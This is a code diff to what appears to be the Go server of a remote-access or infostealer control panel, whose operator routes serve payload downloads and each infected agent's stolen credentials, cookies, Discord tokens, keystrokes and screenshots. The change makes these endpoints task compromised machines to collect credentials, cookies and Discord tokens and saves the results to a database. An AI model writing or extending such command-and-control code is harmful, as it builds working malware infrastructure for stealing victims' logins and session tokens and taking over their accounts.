@@ -104,9 +104,9 @@ func RegisterRoutes(r *gin.Engine, agentMgr *agent.Manager, taskQueue *task.Queu
 			op.GET("/payloads/:id/download", downloadPayloadHandler(fileMgr))
 			op.DELETE("/payloads/:id", deletePayloadHandler(fileMgr))
 
-			op.GET("/agents/:id/credentials", getCredentialsHandler)
-			op.GET("/agents/:id/cookies", getCookiesHandler)
-			op.GET("/agents/:id/discord", getDiscordTokensHandler)
+			op.GET("/agents/:id/credentials", getCredentialsHandler(taskQueue))
+			op.GET("/agents/:id/cookies", getCookiesHandler(taskQueue))
+			op.GET("/agents/:id/discord", getDiscordTokensHandler(taskQueue))
 			op.GET("/agents/:id/keystrokes", getKeystrokesHandler)
 
 			op.GET("/agents/:id/screenshots", getScreenshotsHandler)
@@ -213,8 +213,16 @@ func agentHTTPDataTaskHandler(agentMgr *agent.Manager, taskQueue *task.Queue, fi
 				if status == "completed" && db != nil {
 					var cmd string
 					_ = db.Get(&cmd, "SELECT COALESCE(command,'') FROM tasks WHERE id = ?", msg.TaskID)
-					if strings.Contains(strings.ToLower(cmd), "screenshot") && len(msg.Output) > 512 {
+					lc := strings.ToLower(cmd)
+					switch {
+					case strings.Contains(lc, "screenshot") && len(msg.Output) > 512:
 						storeScreenshotResult(db, a.ID, msg.Output)
+					case strings.Contains(lc, "credential"):
+						storeCredentialsResult(db, a.ID, msg.Output)
+					case strings.Contains(lc, "cookie"):
+						storeCookiesResult(db, a.ID, msg.Output)
+					case strings.Contains(lc, "discord"):
+						storeDiscordResult(db, a.ID, msg.Output)
 					}
 				}
 			}
@@ -725,9 +733,11 @@ func deleteFileTransferHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
 	}
 }
 
-func getCredentialsHandler(c *gin.Context) {
-	agentID := c.Param("id")
-	if db == nil {
+func getCredentialsHandler(taskQueue *task.Queue) gin.HandlerFunc {
+	return func(c *gin.Context) {
+		agentID := c.Param("id")
+		refreshCollector(taskQueue, agentID, "credentials")
+		if db == nil {
 		c.JSON(http.StatusOK, []interface{}{})
 		return
 	}
@@ -736,12 +746,15 @@ func getCredentialsHandler(c *gin.Context) {
 		c.JSON(http.StatusOK, []interface{}{})
 		return
 	}
-	c.JSON(http.StatusOK, rows)
+		c.JSON(http.StatusOK, rows)
+	}
 }
 
-func getCookiesHandler(c *gin.Context) {
-	agentID := c.Param("id")
-	if db == nil {
+func getCookiesHandler(taskQueue *task.Queue) gin.HandlerFunc {
+	return func(c *gin.Context) {
+		agentID := c.Param("id")
+		refreshCollector(taskQueue, agentID, "cookies")
+		if db == nil {
 		c.JSON(http.StatusOK, []interface{}{})
 		return
 	}
@@ -750,12 +763,15 @@ func getCookiesHandler(c *gin.Context) {
 		c.JSON(http.StatusOK, []interface{}{})
 		return
 	}
-	c.JSON(http.StatusOK, rows)
+		c.JSON(http.StatusOK, rows)
+	}
 }
 
-func getDiscordTokensHandler(c *gin.Context) {
-	agentID := c.Param("id")
-	if db == nil {
+func getDiscordTokensHandler(taskQueue *task.Queue) gin.HandlerFunc {
+	return func(c *gin.Context) {
+		agentID := c.Param("id")
+		refreshCollector(taskQueue, agentID, "discord")
+		if db == nil {
 		c.JSON(http.StatusOK, []interface{}{})
 		return
 	}
@@ -764,7 +780,8 @@ func getDiscordTokensHandler(c *gin.Context) {
 		c.JSON(http.StatusOK, []interface{}{})
 		return
 	}
-	c.JSON(http.StatusOK, rows)
+		c.JSON(http.StatusOK, rows)
+	}
 }
 
 func getKeystrokesHandler(c *gin.Context) {
